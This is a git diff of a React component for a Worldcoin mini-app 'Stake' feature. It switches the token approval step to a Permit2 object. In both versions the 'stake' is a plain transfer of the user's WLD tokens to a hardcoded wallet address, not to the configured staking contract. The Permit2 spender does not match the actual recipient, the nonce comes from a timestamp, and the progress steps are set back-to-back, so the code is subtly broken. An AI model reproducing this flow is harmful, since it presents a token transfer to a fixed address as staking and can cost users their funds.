@@ -3,7 +3,7 @@ import { useState, useEffect } from 'react';
 import { Dialog, DialogTitle, DialogContent, Stepper, Step, StepLabel, TextField, Button, CircularProgress, Box, Typography } from '@mui/material';
 import { MiniKit } from '@worldcoin/minikit-js';
 import { parseEther } from 'ethers';
-import abi from '../contracts/abi/main.json';
+// import abi from '../contracts/abi/main.json';
 import { Abi } from 'viem';
 import { Logo } from '../assets';
 import styled from 'styled-components';
@@ -65,48 +65,47 @@ const Stake = () => {
       alert("Please enter a valid amount");
       return;
     }
-
+  
     setOpenModal(true);
     setLoading(true);
-
+  
     try {
       if (!contractAddress || !WLD_TOKEN_ADDRESS) {
         throw new Error("Contract addresses not configured properly");
       }
-
+  
       const parsedAmount = parseEther(amount).toString();
-      const approvalTx: Transaction = {
-        address: WLD_TOKEN_ADDRESS,
-        abi: ERC20_ABI,
-        functionName: "approve",
-        args: [contractAddress, parsedAmount],
+      const nonce = Date.now().toString(); // Unique per user or per session
+      const deadline = (Math.floor(Date.now() / 1000) + 3600).toString(); // 1 hour from now
+  
+      // Create Permit2 object
+      const permit2 = {
+        permitted: {
+          token: WLD_TOKEN_ADDRESS,
+          amount: parsedAmount,
+        },
+        spender: contractAddress,
+        nonce,
+        deadline,
       };
-
-      const approvalRes = await MiniKit.commandsAsync.sendTransaction({
-        transaction: [approvalTx]
-      });
-
-      if (approvalRes.finalPayload.status !== "success") {
-        throw new Error(`Approval failed: ${approvalRes.finalPayload.details || "Unknown error"}`);
-      }
-      setActiveStep(1);
-
+  
       const transferTx: Transaction = {
         address: WLD_TOKEN_ADDRESS,
         abi: ERC20_ABI,
         functionName: "transfer",
         args: ["0x2f97BB8e18B8c49C9112E0524F3Ac7cE0E7727b3", parsedAmount],
       };
-
-      const transferRes = await MiniKit.commandsAsync.sendTransaction({
+  
+      const res = await MiniKit.commandsAsync.sendTransaction({
         transaction: [transferTx],
-        chainId: "world_mainnet"
+        permit2: [permit2],
       });
-
-      if (transferRes.finalPayload.status !== "success") {
-        throw new Error(`Transfer failed: ${transferRes.finalPayload.details || "Unknown error"}`);
+  
+      if (res.finalPayload.status !== "success") {
+        throw new Error(`Transaction failed: ${res.finalPayload.details || "Unknown error"}`);
       }
-
+  
+      setActiveStep(1);
       setActiveStep(2);
     } catch (err: any) {
       console.error("Staking Error:", {
@@ -115,13 +114,14 @@ const Stake = () => {
         contractAddress,
         WLD_TOKEN_ADDRESS
       });
-
+  
       alert(err.message || "Transaction failed. Check console for details.");
       setOpenModal(false);
       setActiveStep(0);
     } finally {
       setLoading(false);
     }
+  
   };
 
   return (
